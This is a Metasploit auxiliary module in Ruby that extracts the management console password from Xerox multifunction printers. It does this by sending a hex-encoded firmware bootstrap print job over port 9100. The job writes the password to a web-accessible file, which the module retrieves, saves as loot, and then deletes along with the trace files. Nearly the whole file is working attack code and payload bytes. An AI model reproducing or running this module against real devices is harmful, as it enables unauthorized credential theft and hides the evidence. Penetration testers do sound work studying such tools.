#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report


  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Xerox Console Password Extract',
      'Description'    => %{
        This module will extract the management console password from Xerox file system using firmware bootstrap injection.
      },
      'Author'         =>
        [
          'Deral "Percentx" Heiland',
          'Pete "Bokojan" Arzamendi'
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptInt.new('RPORT', [ true, "Web management console port", 80]),
        OptInt.new('JPORT', [ true, "Jetdirect port", 9100]),
        OptInt.new('TIMEOUT', [true, "Timeout for printer probe", 20])

      ], self.class)
  end

# Time to start the fun
  def run()
    print_status("Attempting to extract admin console passwords on Xerox MFP at #{rhost}")
    unless write
        return
    end
    sleep(30)
    passwd = retrieve
    unless !passwd
      loot_name     = "xerox.password"
      loot_type     = "text/plain"
      loot_filename = "xerox-password.text"
      loot_desc     = "Xerox password harvester"
      p = store_loot(loot_name, loot_type, datastore['RHOST'], passwd, loot_filename, loot_desc)
      print_status("Credentials saved in: #{p.to_s}")
    else
        return
    end
    remove
  end

#Trigger firmware bootstrap write out password data to URL root
  def write
    print_status("Sending print job")
    createurl = "\x25\x25\x58\x52\x58\x62\x65\x67\x69\x6e\x0a\x25\x25\x4f\x49\x44"
    createurl << "\x5f\x41\x54\x54\x5f\x4a\x4f\x42\x5f\x54\x59\x50\x45\x20\x4f\x49"
    createurl << "\x44\x5f\x56\x41\x4c\x5f\x4a\x4f\x42\x5f\x54\x59\x50\x45\x5f\x44"
    createurl << "\x59\x4e\x41\x4d\x49\x43\x5f\x4c\x4f\x41\x44\x41\x42\x4c\x45\x5f"
    createurl << "\x4d\x4f\x44\x55\x4c\x45\x0a\x25\x25\x4f\x49\x44\x5f\x41\x54\x54"
    createurl << "\x5f\x4a\x4f\x42\x5f\x53\x43\x48\x45\x44\x55\x4c\x49\x4e\x47\x20"
    createurl << "\x4f\x49\x44\x5f\x56\x41\x4c\x5f\x4a\x4f\x42\x5f\x53\x43\x48\x45"
    createurl << "\x44\x55\x4c\x49\x4e\x47\x5f\x41\x46\x54\x45\x52\x5f\x43\x4f\x4d"
    createurl << "\x50\x4c\x45\x54\x45\x0a\x25\x25\x4f\x49\x44\x5f\x41\x54\x54\x5f"
    createurl << "\x4a\x4f\x42\x5f\x43\x4f\x4d\x4d\x45\x4e\x54\x20\x22\x4d\x6f\x6e"
    createurl << "\x20\x4e\x6f\x76\x20\x31\x34\x20\x31\x33\x3a\x35\x30\x3a\x32\x31"
    createurl << "\x20\x45\x53\x54\x20\x32\x30\x31\x31\x22\x0a\x25\x25\x4f\x49\x44"
    createurl << "\x5f\x41\x54\x54\x5f\x4a\x4f\x42\x5f\x43\x4f\x4d\x4d\x45\x4e\x54"
    createurl << "\x20\x22\x70\x61\x74\x63\x68\x20\x4d\x6f\x6e\x20\x4a\x75\x6c\x20"
    createurl << "\x32\x39\x20\x31\x35\x3a\x33\x33\x3a\x34\x37\x20\x45\x44\x54\x20"
    createurl << "\x32\x30\x31\x33\x22\x0a\x25\x25\x4f\x49\x44\x5f\x41\x54\x54\x5f"
    createurl << "\x44\x4c\x4d\x5f\x4e\x41\x4d\x45\x20\x22\x78\x65\x72\x6f\x78\x22"
    createurl << "\x0a\x25\x25\x4f\x49\x44\x5f\x41\x54\x54\x5f\x44\x4c\x4d\x5f\x56"
    createurl << "\x45\x52\x53\x49\x4f\x4e\x20\x22\x4e\x4f\x5f\x44\x4c\x4d\x5f\x56"
    createurl << "\x45\x52\x53\x49\x4f\x4e\x5f\x43\x48\x45\x43\x4b\x22\x0a\x25\x25"
    createurl << "\x4f\x49\x44\x5f\x41\x54\x54\x5f\x44\x4c\x4d\x5f\x53\x49\x47\x4e"
    createurl << "\x41\x54\x55\x52\x45\x20\x22\x38\x62\x61\x30\x31\x39\x38\x30\x39"
    createurl << "\x39\x33\x66\x35\x35\x66\x35\x38\x33\x36\x62\x63\x63\x36\x37\x37"
    createurl << "\x35\x65\x39\x64\x61\x39\x30\x62\x63\x30\x36\x34\x65\x36\x30\x38"
    createurl << "\x62\x66\x38\x37\x38\x65\x61\x62\x34\x64\x32\x66\x34\x35\x64\x63"
    createurl << "\x32\x65\x66\x63\x61\x30\x39\x22\x0a\x25\x25\x4f\x49\x44\x5f\x41"
    createurl << "\x54\x54\x5f\x44\x4c\x4d\x5f\x45\x58\x54\x52\x41\x43\x54\x49\x4f"
    createurl << "\x4e\x5f\x43\x52\x49\x54\x45\x52\x49\x41\x20\x22\x65\x78\x74\x72"
    createurl << "\x61\x63\x74\x20\x2f\x74\x6d\x70\x2f\x78\x65\x72\x6f\x78\x2e\x64"
    createurl << "\x6e\x6c\x64\x22\x0a\x25\x25\x58\x52\x58\x65\x6e\x64\x0a\x1f\x8b"
    createurl << "\x08\x00\x80\xc3\xf6\x51\x00\x03\xed\xcf\x3b\x6e\xc3\x30\x0c\x06"
    createurl << "\x60\xcf\x39\x05\xe3\xce\x31\x25\xa7\x8e\xa7\x06\xe8\x0d\x72\x05"
    createurl << "\x45\x92\x1f\x43\x2d\x43\x94\x1b\x07\xc8\xe1\xab\x16\x28\xd0\xa9"
    createurl << "\x9d\x82\x22\xc0\xff\x0d\x24\x41\x72\x20\x57\x1f\xc3\x5a\xc9\x50"
    createurl << "\xdc\x91\xca\xda\xb6\xf9\xcc\xba\x6d\xd4\xcf\xfc\xa5\x56\xaa\xd0"
    createurl << "\x75\x6e\x35\xcf\xba\xd9\xe7\xbe\xd6\x07\xb5\x2f\x48\xdd\xf3\xa8"
    createurl << "\x6f\x8b\x24\x13\x89\x8a\xd9\x47\xbb\xfe\xb2\xf7\xd7\xfc\x41\x3d"
    createurl << "\x6d\xf9\x3c\x4e\x7c\x36\x32\x6c\xac\x49\xc4\xef\x26\x72\x98\x13"
    createurl << "\x4f\x96\x6d\x98\xba\xb1\x67\xf1\x76\x89\x63\xba\x56\xb6\xeb\xe9"
    createurl << "\xd6\x47\x3f\x53\x29\x57\x79\x75\x6f\xe3\x74\x32\x22\x97\x10\x1d"
    createurl << "\xbd\x94\x74\xb3\x4b\xa2\x9d\x2b\x73\xb9\xeb\x6a\x3a\x1e\x89\x17"
    createurl << "\x89\x2c\x83\x89\x9e\x87\x94\x66\x97\xa3\x0b\x56\xf8\x14\x8d\x77"
    createurl << "\xa6\x4a\x6b\xda\xfc\xf7\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    createurl << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8f\xea\x03\x34\x66\x0b\xc1"
    createurl << "\x00\x28\x00\x00"

    begin
      connect(true,{'RPORT' => datastore['JPORT'].to_i})
      sock.put(createurl)
      disconnect
    rescue
      print_error("Error connecting to #{rhost}")
      return
    end
  end

  def retrieve
    print_status("Retrieving  password from #{rhost}")
    request = "GET /Praeda.txt HTTP/1.0\r\n\r\n"

    begin
      connect
      sock.put(request)
      res = sock.get
      passwd = res.match(/^\s*?$(.*+)/m)
      print_status("Extracted Password: #{passwd}")
      disconnect
      return passwd
    rescue
      print_error("Error getting password from #{rhost}")
      return
    end
  end

# Trigger firmware bootstrap to delete the trace files and praeda.txt file from URL
  def remove
    print_status("Removing print job")
    removeurl = "\x25\x25\x58\x52\x58\x62\x65\x67\x69\x6e\x0a\x25\x25\x4f\x49\x44"
    removeurl << "\x5f\x41\x54\x54\x5f\x4a\x4f\x42\x5f\x54\x59\x50\x45\x20\x4f\x49"
    removeurl << "\x44\x5f\x56\x41\x4c\x5f\x4a\x4f\x42\x5f\x54\x59\x50\x45\x5f\x44"
    removeurl << "\x59\x4e\x41\x4d\x49\x43\x5f\x4c\x4f\x41\x44\x41\x42\x4c\x45\x5f"
    removeurl << "\x4d\x4f\x44\x55\x4c\x45\x0a\x25\x25\x4f\x49\x44\x5f\x41\x54\x54"
    removeurl << "\x5f\x4a\x4f\x42\x5f\x53\x43\x48\x45\x44\x55\x4c\x49\x4e\x47\x20"
    removeurl << "\x4f\x49\x44\x5f\x56\x41\x4c\x5f\x4a\x4f\x42\x5f\x53\x43\x48\x45"
    removeurl << "\x44\x55\x4c\x49\x4e\x47\x5f\x41\x46\x54\x45\x52\x5f\x43\x4f\x4d"
    removeurl << "\x50\x4c\x45\x54\x45\x0a\x25\x25\x4f\x49\x44\x5f\x41\x54\x54\x5f"
    removeurl << "\x4a\x4f\x42\x5f\x43\x4f\x4d\x4d\x45\x4e\x54\x20\x22\x4d\x6f\x6e"
    removeurl << "\x20\x4e\x6f\x76\x20\x31\x34\x20\x31\x33\x3a\x35\x30\x3a\x32\x31"
    removeurl << "\x20\x45\x53\x54\x20\x32\x30\x31\x31\x22\x0a\x25\x25\x4f\x49\x44"
    removeurl << "\x5f\x41\x54\x54\x5f\x4a\x4f\x42\x5f\x43\x4f\x4d\x4d\x45\x4e\x54"
    removeurl << "\x20\x22\x70\x61\x74\x63\x68\x20\x4d\x6f\x6e\x20\x4a\x75\x6c\x20"
    removeurl << "\x32\x39\x20\x31\x35\x3a\x34\x31\x3a\x34\x35\x20\x45\x44\x54\x20"
    removeurl << "\x32\x30\x31\x33\x22\x0a\x25\x25\x4f\x49\x44\x5f\x41\x54\x54\x5f"
    removeurl << "\x44\x4c\x4d\x5f\x4e\x41\x4d\x45\x20\x22\x78\x65\x72\x6f\x78\x22"
    removeurl << "\x0a\x25\x25\x4f\x49\x44\x5f\x41\x54\x54\x5f\x44\x4c\x4d\x5f\x56"
    removeurl << "\x45\x52\x53\x49\x4f\x4e\x20\x22\x4e\x4f\x5f\x44\x4c\x4d\x5f\x56"
    removeurl << "\x45\x52\x53\x49\x4f\x4e\x5f\x43\x48\x45\x43\x4b\x22\x0a\x25\x25"
    removeurl << "\x4f\x49\x44\x5f\x41\x54\x54\x5f\x44\x4c\x4d\x5f\x53\x49\x47\x4e"
    removeurl << "\x41\x54\x55\x52\x45\x20\x22\x38\x62\x35\x64\x38\x63\x36\x33\x31"
    removeurl << "\x65\x63\x32\x31\x30\x36\x38\x32\x31\x31\x38\x34\x30\x36\x39\x37"
    removeurl << "\x65\x33\x33\x32\x66\x62\x66\x37\x31\x39\x65\x36\x31\x31\x33\x62"
    removeurl << "\x62\x63\x64\x38\x37\x33\x33\x63\x32\x66\x65\x39\x36\x35\x33\x62"
    removeurl << "\x33\x64\x31\x35\x34\x39\x31\x22\x0a\x25\x25\x4f\x49\x44\x5f\x41"
    removeurl << "\x54\x54\x5f\x44\x4c\x4d\x5f\x45\x58\x54\x52\x41\x43\x54\x49\x4f"
    removeurl << "\x4e\x5f\x43\x52\x49\x54\x45\x52\x49\x41\x20\x22\x65\x78\x74\x72"
    removeurl << "\x61\x63\x74\x20\x2f\x74\x6d\x70\x2f\x78\x65\x72\x6f\x78\x2e\x64"
    removeurl << "\x6e\x6c\x64\x22\x0a\x25\x25\x58\x52\x58\x65\x6e\x64\x0a\x1f\x8b"
    removeurl << "\x08\x00\x5d\xc5\xf6\x51\x00\x03\xed\xd2\xcd\x0a\xc2\x30\x0c\xc0"
    removeurl << "\xf1\x9e\x7d\x8a\x89\x77\xd3\x6e\xd6\xbd\x86\xaf\x50\xb7\xc1\x04"
    removeurl << "\xf7\x41\xdb\x41\x1f\xdf\x6d\x22\x78\xd2\x93\x88\xf8\xff\x41\x92"
    removeurl << "\x43\x72\x48\x20\xa9\xf1\x43\xda\x87\x56\x7d\x90\x9e\x95\xa5\x5d"
    removeurl << "\xaa\x29\xad\x7e\xae\x2b\x93\x1b\x35\x47\x69\xed\x21\x2f\x0a\xa3"
    removeurl << "\xb4\x31\x47\x6d\x55\xa6\x3f\xb9\xd4\xc3\x14\xa2\xf3\x59\xa6\xc6"
    removeurl << "\xc6\x57\xe9\xc5\xdc\xbb\xfe\x8f\xda\x6d\xe5\x7c\xe9\xe5\xec\x42"
    removeurl << "\xbb\xf1\x5d\x26\x53\xf0\x12\x5a\xe7\x1b\x69\x63\x1c\xeb\x39\xd7"
    removeurl << "\x43\x15\xe4\xe4\x5d\x53\xbb\x7d\x4c\x71\x9d\x1a\xc6\x28\x7d\x25"
    removeurl << "\xf5\xb5\x0b\x92\x96\x0f\xba\xe7\xf9\x8f\x36\xdf\x3e\x08\x00\x00"
    removeurl << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfe\xc4\x0d\x40\x0a"
    removeurl << "\x75\xe1\x00\x28\x00\x00"

    begin
      connect(true,{'RPORT' => datastore['JPORT'].to_i})
      sock.put(removeurl)
      disconnect
    rescue
      print_error("Error removing print job from #{rhost}")
      return
    end
  end
end
